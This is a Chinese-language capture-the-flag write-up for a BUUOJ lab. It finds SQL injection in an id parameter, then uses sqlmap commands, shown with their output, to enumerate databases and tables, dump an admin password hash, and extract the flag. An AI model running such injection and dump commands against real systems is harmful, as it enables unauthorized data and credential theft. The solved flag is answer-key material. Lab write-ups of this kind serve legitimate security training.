**启动靶机，访问目标地址：**
![image.png](https://raw.gitmirror.com/DarkLord-W/CloudImages/main/images/20251018171813321.png)

**点击测试，发现id参数处存在漏洞**
![image.png](https://raw.gitmirror.com/DarkLord-W/CloudImages/main/images/20251018172011172.png)

**那么，测试库表列的数据**
```c
//sqlmap -u "http://99ff08ec-b415-4fbf-908d-13a13b02b1ed.node5.buuoj.cn:81/backend/content_detail.php?id=2"  --dbs

available databases [6]:                                                                                
[*] ctftraining
[*] information_schema
[*] mysql
[*] news
[*] performance_schema
[*] test
```

```c
//sqlmap -u "http://99ff08ec-b415-4fbf-908d-13a13b02b1ed.node5.buuoj.cn:81/backend/content_detail.php?id=2"  -D news --tables

Database: news                                                                                                                
[2 tables]
+----------+
| admin    |
| contents |
+----------+
```

```c
//sqlmap -u "http://99ff08ec-b415-4fbf-908d-13a13b02b1ed.node5.buuoj.cn:81/backend/content_detail.php?id=2"  -D news -T admin --columns

Database: news                                                                                                                
Table: admin
[3 columns]
+----------+--------------+
| Column   | Type         |
+----------+--------------+
| id       | int(11)      |
| password | varchar(128) |
| username | varchar(128) |
+----------+--------------+
```

```c
//sqlmap -u "http://99ff08ec-b415-4fbf-908d-13a13b02b1ed.node5.buuoj.cn:81/backend/content_detail.php?id=2"  -D news -T admin -C "username,password"    --technique=U

Database: news
Table: admin
[1 entry]
+----------+----------------------------------+
| username | password                         |
+----------+----------------------------------+
| admin    | 5f0dbd981287cea1b92253e6cef08f10 |
+----------+----------------------------------+

```

**使用爆破出来的用户密码登陆，失败**
![image.png](https://raw.gitmirror.com/DarkLord-W/CloudImages/main/images/20251018173259863.png)

**重新获取ctftraining数据库中的数据：**
```c
//sqlmap -u "http://99ff08ec-b415-4fbf-908d-13a13b02b1ed.node5.buuoj.cn:81/backend/content_detail.php?id=2"  -D ctftraining --tables

Database: ctftraining                                                                                                         
[3 tables]
+-------+
| flag  |
| news  |
| users |
+-------+
```

```c
//sqlmap -u "http://99ff08ec-b415-4fbf-908d-13a13b02b1ed.node5.buuoj.cn:81/backend/content_detail.php?id=2"  -D ctftraining -T flag --columns

Database: ctftraining
Table: flag
[1 column]
+--------+-----------+
| Column | Type      |
+--------+-----------+
| flag   | char(128) |
+--------+-----------+
```

```c
//sqlmap -u "http://99ff08ec-b415-4fbf-908d-13a13b02b1ed.node5.buuoj.cn:81/backend/content_detail.php?id=2"  -D ctftraining -T flag --dump 

Database: ctftraining
Table: flag
[1 entry]
+--------------------------------------------+
| flag                                       |
+--------------------------------------------+
| flag{296578ef-a06e-4428-a614-ee8a3a9368fc} |
+--------------------------------------------+
```
**成功获取flag**
